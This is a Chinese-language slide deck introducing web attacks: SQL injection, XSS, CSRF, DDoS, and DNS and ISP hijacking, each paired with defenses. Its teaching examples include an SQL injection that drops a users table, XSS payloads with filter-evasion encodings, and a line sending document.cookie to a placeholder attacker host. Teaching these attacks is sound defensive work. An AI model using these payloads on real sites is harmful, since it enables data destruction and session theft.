title: 网络安全那些事
speaker: trimmer
transition: slide2
theme: moon

[slide]

# Web安全那些事
## 演讲者：trimmer

[slide]

# 常见的Web攻击
----
* sql注入 {:&.rollIn}
* XSS
* CSRF
* DDOS
* HTTP(ISP) 劫持
* DNS 劫持

[slide]
# SQL/NoSQL 注入

[slide]
# SQL注入方式
----
* 比如登录时需要验证用户名/密码
```sql
SELECT * FROM users WHERE name = 'myName' AND password = 'password';
```

* 当hacker输入的带有攻击性的密码的时候
```sql
SELECT * FROM users WHERE name = 'myName' AND password = 'password'; DROP TABLE users;
```
> 这样黑客就可以删除你的用户表了。

[slide]
# 如何进行SQL防护？

[slide]
----
* 使用正则表达式过滤传入的参数
* 对用户输入进行转义,验证用户输入的类型
* 绑定变量，使用预编译语句
* 使用数据库自带的一系列函数进行查询

[slide]
# XSS (Cross-site scripting) 
## 跨脚本攻击, 是一种代码注入方式(js,vb,css,flash等)

[slide]
# XSS 原理

[slide]
* 比如有个论坛，网站没有对用户的输入进行严格的限制, 使得攻击者可以将脚本插入到回复的帖子里，把脚本插入到数据库中。

```js
//comment 为:
<script type="text/javascript">
    alert('xss');
</script>
```

那么其他人打开该帖子网站时，根本无法察觉, 自己已经变成XSS’s victim。

[slide]
# 其他的注入方式
----
* 攻击者可以通过url的方式注入脚本信息。
```js
https://www.mysite.com?parms=<script>alert('xss');</script>
```
* 使用标签属性等方式来上传脚本进行攻击
```js
<table background="javascript:alert(/xss/)"></table>
<img src="javascript:alert('xss')">
```
* 回避检查的方式
```js
<img src="javas cript:
alert('xss')">
```

* 通过各种编码转换 (URL 编码, Unicode 编码, HTML 编码, ESCAPE 等) 来绕过检查
```js
<img%20src=%22javascript:alert('xss');%22>
<img src="javascrip&#116&#58alert(/xss/)">
```

[slide]
# XSS 能做什么？（危害）

----
* 通过document.cookie 获取用户的cookie信息，假冒用户进行登录  {:&.rollIn}
```js
window.location='http://attacker/?cookie='+document.cookie
```

* 对界面进行修改
* if页面上有用户输入的私密信息，比如银行账号,密码等。就可以绑定监听， 并通过ajax将信息发送给hacker
* 地址的重定向,去访问黑客的网站。


[slide]
# 如何进行防御呢？

----
* 在 cookie 中设置 HttpOnly 属性后，js脚本将无法读取到 cookie 信息 {:&.rollIn}
* 对url进行encoding，escape，encodeURI，encodeURIComponent
* JavaScriptEncode
* HtmlEncode
* Content Security Policy，缩写[CSP 策略](http://www.ruanyifeng.com/blog/2016/09/csp.html)

[slide]
# CSRF(cross-site request forgery or 跨站点请求伪造)， 钓鱼

[slide]
# CSRF 原理/方式

----
* 比如有网站A，和用户U,已知网站A转账接口是post到某个地址，并指定id
* 当用户登入A网站，将产生cookie（session id 常常存在cookie中），通过黑客先前设置的xss的攻击脚本，获取cookie信息，并诱使用户访问钓鱼网站B。（无须用户点击网站B）
* 在钓鱼网站B，拼接出转账请求，附带cookie信息，发送到A网站。

[slide]

# 钓鱼方式包括但不限于公开网站 (xss), 攻击者的恶意网站, email 邮件, 微博, 微信, 短信等及时消息.

[slide]
# 如何进行防御呢？

[slide]
* 同源检查, 主要检查一下两个 header: Origin Header, Referer Header
* 验证码, (用户体验差)
* token
* 尽量用JSON 类型进行传输，当有脚本注入到页面时
```html
<form action="http://example.com" method="POST">  
  <input type="text" name="account">
  <input type="text" name="password">
  <input type="submit">
</form> 
```
> form 传输的格式为: Content-Type: application/x-www-form-urlencoded 而,JSON的传输类型为: Content-Type: application/json form 没有办法去模仿JSON类型进行传输

[slide]
# [DDOS](http://www.ruanyifeng.com/blog/2018/06/ddos.html) 分布式拒绝服务

## 无解的攻击？

[slide]
# 如何防范？

----
* 专用硬件, Web 服务器的前面可以架设硬件防火墙，专门过滤请求。这种效果最好，但是价格也最贵
* 本机防火墙,使用 iptables, 拦截 IP 地址1.2.3.4的请求
```
$ iptables -A INPUT -s 1.2.3.4 -j DROP
```
* Web 服务器过滤， 拦截 IP 地址1.2.3.4
```
location / {
  deny 1.2.3.4;
}
```
* [TCP防护](https://zhuanlan.zhihu.com/p/31339486)
* [阿里架构经验](https://zhuanlan.zhihu.com/p/27843235#comment-305100940)


[slide]
# DNS hijacking （DNS劫持）

----
> DNS hijack的攻击成本很大, 但是,成功后的危害也是相当大的。

> 当用户下载了来源不明的video,image, software（附带木马病毒），病毒会修改你的ISP服务配置，即DNS提供商的IP地址，然后, hacker会将他control的DNS Server 填加进去.

> 用户输入一个真域名，向 fake DNS Server 发起UDP请求，然后, DNS返回一个malicious的IP地址, 结果,用户打开的是一个全屏广告,或者是 妹妹寂寞的网页。

[slide]
# 如何进行防御呢？

[slide]
* 这是用户层面的hack，对开发无能为力
* 找到DNS列表,然后对应FBI或者国家安全网提供的[DNSchanger IP](http://www.dcwg.org/detect/checking-osx-for-infections/)对照一下,如果有就[清理](http://www.dcwg.org/fix/)下。

[slide]
# HTTP(ISP) 劫持

----
>  当你打开一个页面, 结果左侧右侧全是些iframe广告,这是电信, 联通那些ISP 提供商干的，由于没有完备的网络法, 对于ISP 干的这些龌蹉勾当，监管局根本不鸟你。CN特别猖獗。

[slide]
# HTTP(ISP) 劫持原理
> CN的运营商并不是hacker, 他不会这样或那样的获取用户的信息, 可能为了商业目的

----
* 当C->S 发送一个网页请求
* ISP 获得之后, 给他自己的缓存服务器
* 如果命中缓存, 则返回已经修改过后的页面信息(满屏操广告). 如果没有, 要么是你的网页浏览量不够，要么是别人已经存满了，你的网页侥幸的没有被插菊花.
* 命中后,缓存服务器伪装为S,给C发送一个302(临时移动,告诉你,应该从另外一个地方去取资源). 由于, 这是个重定向,所以传输速度就不用说了, C 就只能乖乖的去缓存服务器那取资源. 而忽略正确的Server返回的数据.

[slide]
# HTTP(ISP) 劫持防护

[slide]
##普通用户的防范
* 直接和你家网络提供商打电话,让他取消广告推送.
* [HTTP 防劫持](https://github.com/lehui99/ahjs5s)

[slide]
##developer 防范
* 使用HTTPS加密方式传输,因为, ISP就是通过抓你的HTTP包，然后分析里面的内容，最终得到结果. 而使用HTTPS 方式, 即使ISP 得到你的HTTPS包,由于有SSL 的加密， 他也不能获得你的包内容
* 替换你的js的提供商，使用HTTPS路径进行加载,因为, ISP 不经可以结果你的HTML, 也可以结果你网页中所有的HTTP请求，而js又是最重要的内容，所以，把这个控制到了，那么你网页可以抵挡差不多80%的HTTP 劫持.

[slide]
# 安全相关
----
* [Crypto加密](http://nodejs.cn/api/crypto.html) {:&.rollIn}
* [TLS/SSL](http://www.ruanyifeng.com/blog/2014/02/ssl_tls.html)
* [HTTPS](http://www.ruanyifeng.com/blog/2016/08/migrate-from-http-to-https.html)
> https与http的区别就是： 在请求前，会建立ssl链接，确保接下来的通信都是加密的，无法被轻易截取分析